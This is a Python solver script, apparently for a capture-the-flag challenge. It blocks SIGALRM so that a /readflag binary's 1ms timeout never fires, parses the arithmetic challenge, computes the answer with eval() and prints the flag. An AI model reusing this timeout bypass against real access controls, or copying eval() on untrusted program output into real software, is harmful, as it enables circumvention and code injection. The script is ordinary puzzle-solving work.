import signal
import subprocess
import sys
import re
import os

# Redirect all output to stderr to ensure it shows up in the PTY stream
def log(msg):
    sys.stderr.write(f"[EXPLOIT] {msg}\n")
    sys.stderr.flush()

def main():
    log("Solver started!")
    log(f"CWD: {os.getcwd()}")
    
    # Block SIGALRM to bypass the 1ms timeout in readflag
    try:
        signal.pthread_sigmask(signal.SIG_BLOCK, [signal.SIGALRM])
        log("SIGALRM blocked")
    except Exception as e:
        log(f"Failed to block SIGALRM: {e}")

    try:
        log("Running /readflag...")
        p = subprocess.Popen(
            ["/readflag"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=0 
        )

        buffer = ""
        log("Waiting for math expression...")
        while True:
            char = p.stdout.read(1)
            if not char: break
            buffer += char
            if "input your answer:" in buffer:
                break
        
        log(f"Challenge received: {buffer.strip()}")

        # Improved regex for math expression
        match = re.search(r'(\({2,}.*?\))', buffer, re.DOTALL)
        if not match:
            # Fallback: find anything that looks like math
            match = re.search(r'([\d\+\-\(\)\s]{5,})', buffer)

        if match:
            expression = match.group(1).strip()
            log(f"Evaluating: {expression}")
            answer = eval(expression)
            log(f"Calculated Answer: {answer}")

            # Send the answer
            p.stdin.write(f"{answer}\n")
            p.stdin.flush()

            # Read the rest of the output (the flag)
            log("Reading result...")
            result = p.stdout.read()
            log(f"RESULT: {result}")
            # Print to stdout so it definitely shows in logs
            print(f"\n\nFLAG_FOUND: {result}\n\n", flush=True)
        else:
            log("Could not find math expression in buffer")

    except Exception as e:
        log(f"Error during execution: {e}")

if __name__ == "__main__":
    main()